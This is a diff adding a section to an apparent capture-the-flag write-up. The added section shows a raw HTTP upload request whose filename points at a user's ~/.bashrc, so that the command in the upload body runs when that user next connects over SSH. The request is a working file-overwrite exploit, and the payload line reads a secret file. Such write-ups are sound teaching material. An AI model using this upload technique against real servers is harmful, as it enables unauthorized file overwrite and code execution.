@@ -20,6 +20,28 @@ connects over SSH, typically they're using bash as their shell and will load the
 files ~/.profile and ~/.bashrc on connect. We are able to overwrite these two files by changing  
 the filename of the upload:  
 
+```http
+POST /SimpleHTTPServerWithUpload.py HTTP/1.1
+Host: web01.grandprix.whitehatvn.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://files.fm/
+X-File-Upload: uploadingfiles
+Content-Length: 228
+Content-Type: multipart/form-data; boundary=---------------------------158661620315800
+Origin: https://files.fm
+Connection: close
+
+-----------------------------158661620315800
+Content-Disposition: form-data; name="file"; filename="/home/manhndd/.bashrc"
+Content-Type: text/html
+cp /var/secret | /opt/dogs
+
+-----------------------------158661620315800
+```
+
 ![bashrc](screenshots/bashrc.png)
 
 The issue is that every other team is going to be trying to stomp on these files.  
